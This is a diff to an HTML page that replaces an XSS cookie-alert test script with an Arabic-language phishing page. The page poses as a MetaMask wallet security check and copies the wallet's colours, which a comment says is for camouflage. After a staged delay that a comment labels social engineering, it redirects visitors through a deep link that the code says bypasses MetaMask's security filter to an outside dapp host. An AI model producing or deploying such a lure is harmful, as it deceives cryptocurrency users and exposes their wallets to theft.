@@ -1,10 +1,66 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحقق من أمان المحفظة...</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f7f9;
+            color: #333;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #f6851b; /* لون MetaMask البرتقالي للتمويه */
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .message { margin-top: 25px; font-size: 1.3rem; font-weight: bold; }
+        .sub-message { margin-top: 10px; color: #666; font-size: 0.9rem; }
+        button {
+            margin-top: 30px;
+            padding: 12px 25px;
+            background-color: #f6851b;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+    </style>
+</head>
 <body>
 
-<script>alert(document.cookie)
-</script>
+    <div class="loader"></div>
+    <div class="message">جاري الربط مع تطبيق MetaMask...</div>
+    <div class="sub-message">يرجى الموافقة على طلب الفتح إذا ظهر لك.</div>
 
-<script type="text/javascript" src="js/script.js"></script>
+    <script>
+        // الرابط الذي اكتشفنا أنه يتجاوز الفلتر الأمني
+        const targetUrl = "metamask://browse?url=dapp://hatestck.vercel.app";
+
+        // وظيفة التحويل التلقائي
+        function redirectToMetaMask() {
+            window.location.href = targetUrl;
+        }
+
+        // محاولة التحويل بعد 1.5 ثانية لإعطاء طابع رسمي (Social Engineering)
+        window.onload = function() {
+            setTimeout(redirectToMetaMask, 1500);
+        };
+    </script>
+
+    <button onclick="redirectToMetaMask()">اضغط هنا للمتابعة يدوياً</button>
+
 </body>
 </html>
